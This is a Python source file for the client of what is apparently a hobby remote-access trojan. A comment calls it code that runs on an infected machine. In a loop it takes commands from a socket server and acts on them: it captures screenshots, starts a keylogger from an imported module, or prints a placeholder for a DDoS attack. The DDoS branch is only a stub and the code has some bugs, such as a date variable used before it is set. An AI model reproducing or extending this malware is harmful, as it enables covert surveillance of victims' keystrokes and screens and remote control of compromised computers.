import socket
import sys
import selectors
import types

from client_keylogger import *
import os
import pyautogui
import glob
from datetime import datetime
import time

# CODE THAT RUNS ON INFECTED MACHINE WILL GO HERE

HOST = "127.0.0.1"
PORT = 1234

def doTask(task):

    # Takes a screenshot at the python file location
    if task[0] == 'screenshot':
        print("Taking screenshot...")
        PATH = os.path.dirname('task.txt')
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(PATH + f"screenshot_{date}" + ".png")

    # The keylogger cannot be stopped except by stopping the whole program!!
    elif task[0] == 'keylogger':
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()
    elif task[0] == 'ddos':
        print("DDOS " + task[1])
    else:
        print("no task done")


task = ''

while task != "stop":

    # Obtain current task with socket?
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(b"Hello, world")
        data = s.recv(1024)
        task = data.decode('utf-8').split(" ")

    print(f"Received {data!r}")

    # Obtain current task
    #file = open('task.txt')
    #lines = file.readlines()
    #task = lines[0]

    # List of current files and latest file added which we might use for some actions
    list_of_screenshots = glob.glob('*.png')
    if (len(list_of_screenshots) > 0):
        latest_file = max(list_of_screenshots, key=os.path.getctime)

    # Current date to add to filenames
    date = datetime.now().strftime("%d_%m_%Y-%H_%M")

    # Execute current task
    doTask(task)
    print("sleep for 10 seconds")
    time.sleep(10)
